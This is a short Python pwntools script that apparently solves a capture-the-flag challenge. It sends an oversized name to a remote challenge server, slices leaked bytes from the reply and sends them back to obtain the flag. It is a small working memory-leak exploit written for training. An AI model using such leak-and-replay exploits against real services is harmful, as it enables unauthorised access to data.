from time import sleep
from pwn import *
context.log_level = "debug"

buf = b"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKL"

app = remote("challs.actf.co", 31223)
app.recvuntil(b'name?')
app.sendline(buf + b"\n")
res = app.recvuntil(b"Guess my name and you'll get a flag!\n")
sleep(0.4)
payload = res[0x43:len(res)-39] 
app.sendline(payload)
print(app.recvall())